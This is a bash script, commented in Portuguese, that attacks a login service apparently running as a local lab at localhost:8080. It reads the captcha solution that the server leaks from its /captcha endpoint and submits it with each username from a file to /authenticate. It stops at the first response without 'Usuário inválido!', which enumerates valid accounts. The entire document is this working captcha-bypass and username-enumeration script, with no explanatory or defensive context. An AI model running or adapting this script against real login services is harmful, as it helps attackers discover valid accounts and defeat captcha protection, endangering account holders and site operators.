#!/bin/bash

# Verifica se um arquivo de usernames foi passado como argumento
if [ "$#" -ne 1 ]; then
    echo "Uso: $0 <arquivo_de_usernames.txt>"
    exit 1
fi

# Arquivo de usernames
usernames_file="$1"

# Função para enviar a requisição e capturar a resposta do captcha
send_captcha_request() {
    response=$(curl -s http://localhost:8080/captcha)
    captcha_id=$(echo $response | jq -r '.captcha_id')
    captcha_solution=$(echo $response | jq -r '.captcha_solution')
}

# Função para autenticar usando captcha_id, captcha_solution, username e password
authenticate() {
    local username=$1
    local password="your_password"

    # Envia a requisição para obter captcha_id e captcha_solution
    send_captcha_request
    
    # Verifica se os valores do captcha foram extraídos corretamente
    if [ -n "$captcha_id" ] && [ -n "$captcha_solution" ]; then
        payload=$(jq -n \
            --arg captcha_id "$captcha_id" \
            --arg captcha_solution "$captcha_solution" \
            --arg username "$username" \
            --arg password "$password" \
            '{captcha_id: $captcha_id, captcha_solution: $captcha_solution, username: $username, password: $password}')
        
        auth_response=$(curl -s -H "Content-Type: application/json" -d "$payload" http://localhost:8080/authenticate)
        
        # Verifica se a resposta de autenticação não contém "Usuário inválido!"
        if [[ "$auth_response" != *"Usuário inválido!"* ]]; then
            echo "User: $username"
            echo "Authentication response: $auth_response"
            return 0
        fi
    fi

    return 1
}

# Lê o arquivo de usernames e autentica cada usuário até encontrar um que não retorne "Usuário inválido!"
while IFS= read -r username; do
    if authenticate "$username"; then
        break
    fi
    echo "-----------------------------------"
done < "$usernames_file"
